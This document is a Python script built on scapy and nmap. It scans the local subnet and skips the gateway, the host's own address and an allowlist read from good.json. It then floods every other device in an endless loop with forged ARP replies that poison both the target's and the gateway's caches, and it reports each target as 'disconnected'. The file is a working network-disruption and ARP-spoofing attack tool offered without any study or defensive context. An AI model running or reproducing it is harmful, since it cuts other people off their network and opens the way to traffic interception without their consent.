from time import sleep

from colorama import Fore as F
from getmac import get_mac_address as __get_host_mac
from scapy.all import send
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether

import ipaddress
import os
import re
import socket
import sys
from functools import cache
from time import sleep
from typing import List
from urllib.parse import urlparse
import json

def get_host_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(("8.8.8.8", 80))
        IP = s.getsockname()[0]
    except:
        sys.exit(1)
    s.close()
    return IP

def __get_local_host_ips() -> List[str]:
    report = (
        os.popen(f"nmap -sP {'.'.join(get_host_ip().split('.')[:3]) + '.1-255'}")
        .read()
        .split("\n")
    )
    pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
    hosts: List[str]
    hosts = []
    for line in report:
        try:
            hosts.append(pattern.search(line)[0])
        except TypeError:
            continue
    return hosts

def __get_mac(target: str) -> str:
    while True:
        try:
            arp_request = ARP(pdst=target)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            ans = srp(packet, timeout=5, verbose=False)[0]
            mac_addr = ans[0][1].hwsrc
        except IndexError:
            continue
        else:
            return mac_addr

GATEWAY_IP = __get_local_host_ips()[0]
GATEWAY_MAC = __get_mac(GATEWAY_IP)
HOST_MAC = __get_host_mac()

with open("good.json", "r") as f:
    good = json.load(f)

bad = __get_local_host_ips()

btw = __get_local_host_ips()

myip = get_host_ip()

if GATEWAY_IP in bad:
    good.append(GATEWAY_IP)
if myip in bad:
	good.append(myip)
for host in good:
        if host in bad:
            bad.remove(host)


def flood(target: str) -> None:
    packet = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target)
    send(packet, verbose=False)

    print(
        f"{F.GREEN}{target}{F.RESET} is now disconnected{F.RESET}\r",
        end="",
    )
    sleep(0.5)

def main():
    for i in btw:
        if i in good:
            print(f"{F.GREEN}{i}{F.RESET}")
        else:
            print(f"{F.RED}{i}{F.RESET}")
    sleep(5)
    while True:
        for target in bad:
            flood(target)

if __name__ == "__main__":
    main()
